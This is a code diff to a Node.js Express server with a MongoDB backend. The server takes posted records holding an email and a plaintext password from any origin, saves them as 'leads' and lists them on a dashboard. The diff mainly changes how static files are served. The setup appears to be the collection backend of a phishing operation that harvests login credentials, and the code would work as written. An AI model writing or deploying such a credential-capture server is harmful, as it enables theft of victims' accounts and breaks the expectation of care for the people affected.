@@ -2,18 +2,20 @@ const express = require('express');
 const mongoose = require('mongoose');
 const bodyParser = require('body-parser');
 const cors = require('cors');
+const path = require('path');
 
 const app = express();
 app.use(cors());
 app.use(bodyParser.json());
-app.use(express.static('public'));
 
-// Connect to MongoDB using the URI from your environment variables
+// This allows you to access dashboard.html via: 
+// https://cb-backend-new.onrender.com/dashboard.html
+app.use(express.static(path.join(__dirname, 'public')));
+
 mongoose.connect(process.env.MONGO_URI)
   .then(() => console.log("Connected to MongoDB successfully"))
   .catch(err => console.error("Mongo connection error:", err));
 
-// Define Schema and specify the collection name 'leads'
 const leadSchema = new mongoose.Schema({
     email: String,
     password: String,
@@ -24,7 +26,6 @@ const leadSchema = new mongoose.Schema({
 
 const Lead = mongoose.model('Lead', leadSchema, 'leads');
 
-// Endpoint to receive data from frontend
 app.post('/update', async (req, res) => {
     try {
         const lead = new Lead(req.body);
@@ -36,7 +37,6 @@ app.post('/update', async (req, res) => {
     }
 });
 
-// Endpoint to serve the dashboard
 app.get('/dashboard', async (req, res) => {
     try {
         const leads = await Lead.find().sort({ timestamp: -1 });
@@ -45,11 +45,6 @@ app.get('/dashboard', async (req, res) => {
         console.error("Fetch error:", err);
         res.status(500).send("Error fetching leads.");
     }
-});
-
-// Serve the dashboard.html file
-app.get('/dashboard.html', (req, res) => {
-    res.sendFile(__dirname + '/dashboard.html');
 });
 
 const PORT = process.env.PORT || 3000;
